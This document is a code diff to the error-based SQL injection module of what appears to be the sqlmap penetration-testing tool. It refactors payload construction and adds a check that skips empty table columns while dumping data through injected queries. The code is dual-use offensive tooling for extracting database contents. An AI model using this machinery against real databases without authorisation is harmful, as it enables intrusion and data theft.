@@ -32,9 +32,11 @@ from lib.core.data import logger
 from lib.core.data import queries
 from lib.core.enums import DBMS
 from lib.core.enums import PAYLOAD
+from lib.core.settings import CHECK_ZERO_COLUMNS_THRESHOLD
 from lib.core.settings import FROM_DUMMY_TABLE
 from lib.core.settings import MYSQL_ERROR_CHUNK_LENGTH
 from lib.core.settings import MSSQL_ERROR_CHUNK_LENGTH
+from lib.core.settings import NULL
 from lib.core.settings import PARTIAL_VALUE_MARKER
 from lib.core.settings import SLOW_ORDER_COUNT_THRESHOLD
 from lib.core.settings import SQL_SCALAR_REGEX
@@ -44,7 +46,7 @@ from lib.core.threads import runThreads
 from lib.core.unescaper import unescaper
 from lib.request.connect import Connect as Request
 
-def __oneShotErrorUse(expression, field):
+def __oneShotErrorUse(expression, field=None):
     offset = 1
     partialValue = None
     threadData = getCurrentThreadData()
@@ -56,7 +58,13 @@ def __oneShotErrorUse(expression, field):
         offset += len(partialValue)
 
     threadData.resumed = retVal is not None and not partialValue
-    chunk_length = None
+
+    if Backend.isDbms(DBMS.MYSQL):
+        chunk_length = MYSQL_ERROR_CHUNK_LENGTH
+    elif Backend.isDbms(DBMS.MSSQL):
+        chunk_length = MSSQL_ERROR_CHUNK_LENGTH
+    else:
+        chunk_length = None
 
     if retVal is None or partialValue:
         try:
@@ -64,20 +72,17 @@ def __oneShotErrorUse(expression, field):
                 check = "%s(?P<result>.*?)%s" % (kb.chars.start, kb.chars.stop)
                 trimcheck = "%s(?P<result>.*?)</" % (kb.chars.start)
 
-                nulledCastedField = agent.nullAndCastField(field)
+                if field:
+                    nulledCastedField = agent.nullAndCastField(field)
 
-                if Backend.isDbms(DBMS.MYSQL):
-                    chunk_length = MYSQL_ERROR_CHUNK_LENGTH
-                    nulledCastedField = queries[DBMS.MYSQL].substring.query % (nulledCastedField, offset, chunk_length)
-                elif Backend.isDbms(DBMS.MSSQL):
-                    chunk_length = MSSQL_ERROR_CHUNK_LENGTH
-                    nulledCastedField = queries[DBMS.MSSQL].substring.query % (nulledCastedField, offset, chunk_length)
+                    if any(Backend.isDbms(dbms) for dbms in (DBMS.MYSQL, DBMS.MSSQL)):
+                        nulledCastedField = queries[Backend.getIdentifiedDbms()].substring.query % (nulledCastedField, offset, chunk_length)
 
                 # Forge the error-based SQL injection request
                 vector = kb.injection.data[PAYLOAD.TECHNIQUE.ERROR].vector
                 query = agent.prefixQuery(vector)
                 query = agent.suffixQuery(query)
-                injExpression = expression.replace(field, nulledCastedField, 1)
+                injExpression = expression.replace(field, nulledCastedField, 1) if field else expression
                 injExpression = unescaper.unescape(injExpression)
                 injExpression = query.replace("[QUERY]", injExpression)
                 payload = agent.payload(newValue=injExpression)
@@ -148,7 +153,7 @@ def __oneShotErrorUse(expression, field):
 
     return safecharencode(retVal) if kb.safeCharEncode else retVal
 
-def __errorFields(expression, expressionFields, expressionFieldsList, expected=None, num=None):
+def __errorFields(expression, expressionFields, expressionFieldsList, expected=None, num=None, emptyFields=None):
     outputs = []
     origExpr = None
 
@@ -169,14 +174,14 @@ def __errorFields(expression, expressionFields, expressionFieldsList, expected=N
         else:
             expressionReplaced = expression.replace(expressionFields, field, 1)
 
-        output = __oneShotErrorUse(expressionReplaced, field)
+        output = NULL if emptyFields and field in emptyFields else __oneShotErrorUse(expressionReplaced, field)
 
         if not kb.threadContinue:
             return None
 
         if kb.fileReadMode and output and output.strip():
             print
-        elif output is not None and not (threadData.resumed and kb.suppressResumeInfo):
+        elif output is not None and not (threadData.resumed and kb.suppressResumeInfo) and not (emptyFields and field in emptyFields):
             dataToStdout("[%s] [INFO] %s: %s\r\n" % (time.strftime("%X"), "resumed" if threadData.resumed else "retrieved", safecharencode(output)))
 
         if isinstance(num, int):
@@ -222,6 +227,7 @@ def errorUse(expression, expected=None, dump=False):
 
     abortedFlag = False
     count = None
+    emptyFields = []
     start = time.time()
     startLimit = 0
     stopLimit = None
@@ -349,6 +355,14 @@ def errorUse(expression, expected=None, dump=False):
             numThreads = min(conf.threads, (stopLimit - startLimit))
             threadData.shared.outputs = BigArray()
 
+            if kb.dumpTable and (len(expressionFieldsList) < (stopLimit - startLimit) > CHECK_ZERO_COLUMNS_THRESHOLD):
+                for field in expressionFieldsList:
+                    if __oneShotErrorUse("SELECT COUNT(%s) FROM %s" % (field, kb.dumpTable)) == '0':
+                        emptyFields.append(field)
+                        debugMsg = "column '%s' for table '%s' appears to be empty. "
+                        debugMsg += "It's values will not be dumped"
+                        logger.debug(debugMsg)
+
             if stopLimit > TURN_OFF_RESUME_INFO_LIMIT:
                 kb.suppressResumeInfo = True
                 debugMsg = "suppressing possible resume console info because of "
@@ -366,7 +380,7 @@ def errorUse(expression, expected=None, dump=False):
                             except StopIteration:
                                 break
 
-                        output = __errorFields(expression, expressionFields, expressionFieldsList, expected, num)
+                        output = __errorFields(expression, expressionFields, expressionFieldsList, expected, num, emptyFields)
 
                         if not kb.threadContinue:
                             break
